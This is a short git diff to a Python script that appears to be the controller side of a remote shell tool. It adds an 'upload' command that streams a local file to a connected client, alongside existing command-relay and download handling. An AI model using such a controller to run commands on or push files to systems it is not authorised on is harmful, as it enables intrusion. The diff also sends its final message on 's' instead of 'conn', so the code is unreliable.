@@ -88,6 +88,28 @@ def command_skeleton(conn):
 					f.write(file)
 					file = conn.recv(BYTES)
 				f.close()
+			elif cmd == 'upload':
+				try:
+					conn.send(cmd.encode())
+					print("Sent command")
+					path = input("[i] File to upload (include extension): ")
+					conn.send(path.encode())
+					print("sent path")
+					f = open(path, "rb")
+					print("opening file")
+					contents = f.read()
+					print("reading contents")
+					while contents:
+						conn.send(contents)
+						print("Sent contents")
+						contents = f.read(BYTES)
+						print("Read contents")
+					f.close()
+					s.send('complete'.encode())
+					print("Sent final 'complete' message")
+				except FileNotFoundError:
+					print("[i] File not found!")
+					continue
 			else:
 				conn.send(str.encode(cmd))
 				client_response = str(conn.recv(BYTES), "utf-8")
